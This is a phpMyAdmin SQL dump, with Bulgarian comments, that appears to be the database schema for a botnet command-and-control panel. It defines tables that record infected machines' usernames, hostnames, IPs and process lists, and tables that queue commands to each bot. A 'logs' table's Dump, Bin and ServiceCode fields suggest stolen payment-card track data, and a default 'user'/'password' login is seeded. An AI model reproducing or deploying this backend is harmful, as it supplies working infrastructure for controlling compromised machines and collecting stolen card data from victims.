-- phpMyAdmin SQL Dump
-- version 3.4.5
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Време на генериране: 
-- Версия на сървъра: 5.5.16
-- Версия на PHP: 5.3.8

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данни: `nasproject`
--

-- --------------------------------------------------------

--
-- Структура на таблица `bots`
--

CREATE TABLE IF NOT EXISTS `bots` (
  `UID` text,
  `Version` text,
  `Username` text,
  `Computername` text,
  `RemoteIP` text,
  `UserAgent` text,
  `OS` text,
  `Architecture` text,
  `Idle Time` text,
  `Process List` longtext,
  `LastVisit` int(11) DEFAULT NULL,
  `LastCommand` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Структура на таблица `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
  `UID` text,
  `Command` text,
  `InsertTime` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Структура на таблица `config`
--

CREATE TABLE IF NOT EXISTS `config` (
  `Cnf_Name` text,
  `Cnf_ValueText` text,
  `Cnf_ValueInt` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Ссхема на данните от таблица `config`
--

INSERT INTO `config` (`Cnf_Name`, `Cnf_ValueText`, `Cnf_ValueInt`) VALUES
('BotLife', NULL, 40),
('BotsPerPage', NULL, 20),
('DumpsPerPage', NULL, 1);

-- --------------------------------------------------------

--
-- Структура на таблица `logs`
--

CREATE TABLE IF NOT EXISTS `logs` (
  `UID` text,
  `IP` text,
  `Dump` text,
  `Type` text,
  `Bin` text,
  `ServiceCode` text,
  `InsertTime` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Структура на таблица `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `name` text,
  `password` text
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Ссхема на данните от таблица `users`
--

INSERT INTO `users` (`name`, `password`) VALUES
('user', 'password');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
